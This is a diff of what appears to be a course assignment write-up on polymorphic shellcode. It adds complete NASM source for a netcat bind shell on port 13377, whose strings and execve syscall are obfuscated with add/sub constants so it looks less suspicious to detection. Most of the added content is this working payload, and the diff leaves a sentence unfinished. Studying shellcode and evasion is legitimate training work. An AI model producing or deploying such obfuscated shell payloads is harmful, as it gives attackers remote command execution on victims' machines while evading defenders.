@@ -53,8 +53,62 @@ _start:
         int 0x80
 ```
 
-It seems there are several ways we can morph this shellcode.  First, we should obfuscate all those push commands, since they contain the string we intend to execute.  We can do this by saving each string in a register first, adding a constant to it, then pushing it.
+It seems there are several ways we can morph this shellcode.  First, we should obfuscate all those push commands, since they contain the string we intend to execute.  We can do this by saving each string in a register first, adding a constant to it, then pushing it to the stack.  To save space, we'll use the first push command as the constant.  The next piece we should obfuscate is the **execve** syscall, since that could be seen as suspicious.  Below is the resulting shellcode:
 
+```nasm
+; netcat_bind_shell.nasm
+;  - Listen on port 13377 using netcat and provide shell
+;
+; [LINK] http://shell-storm.org/shellcode/files/shellcode-804.php
+
+    global _start
+
+section .text
+_start:
+
+        xor eax,eax
+        mov edi, 0x37373333
+        push edi
+        mov esi, 0x68a7a960     ; 0x3170762d
+        sub esi, edi            ; ...
+        push esi                ; ...
+        mov edx, esp
+        push eax
+        mov esi, 0x313bfc3b     ; push 0x68732f6e
+        add esi, edi            ; ...
+        push esi                ; ...
+        mov esi, 0x322afc32     ; push 0x69622f65
+        add esi, edi            ; ...
+        push esi                ; ...
+        mov esi, 0x3f3f38fa     ; push 0x76766c2d
+        add esi, edi            ; ...
+        push esi                ; ...
+        mov ecx,esp
+        push eax
+        mov esi, 0x2c36fbfc     ; push 0x636e2f2f
+        add esi, edi            ; ...
+        push esi                ; ...
+        mov esi, 0x66666262     ; push 0x2f2f2f2f
+        sub esi, edi            ; ...
+        push esi                ; ...
+        mov esi, 0x37322efc     ; 0x6e69622f
+        add esi, edi            ; ...
+        push esi                ; ...
+        mov ebx, esp
+        push eax
+        push edx
+        push ecx
+        push ebx
+        xor edx,edx
+        mov  ecx,esp
+        mov al,10               ; mov al, 11
+        inc eax                 ; ...
+        int 0x80
+```
+
+The new shellcode is 85 bytes, about 37% more than the original 62 bytes.
+
+Next, we'll look at the 
 
 You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6).
 
